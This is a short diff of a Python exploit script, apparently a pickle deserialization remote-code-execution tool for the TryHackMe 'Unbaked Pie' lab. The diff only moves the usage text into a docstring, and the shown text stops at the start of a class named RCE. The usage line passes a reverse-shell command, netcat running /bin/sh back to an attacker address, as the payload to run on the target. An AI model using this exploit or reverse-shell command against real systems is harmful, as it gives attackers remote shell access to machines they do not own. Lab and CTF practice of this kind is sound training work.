@@ -1,5 +1,9 @@
 #!/usr/bin/python
-#usage: python3 pick.py http://$ip:5003 "nc -e /bin/sh attackIP 53"
+"""
+usage: 
+- for Unbaked Pie on TryHackMe
+python3 pick.py http://$ip:5003 "nc -e /bin/sh attackIP 53"
+"""
 import pickle, base64, os, requests, sys
 
 class RCE:
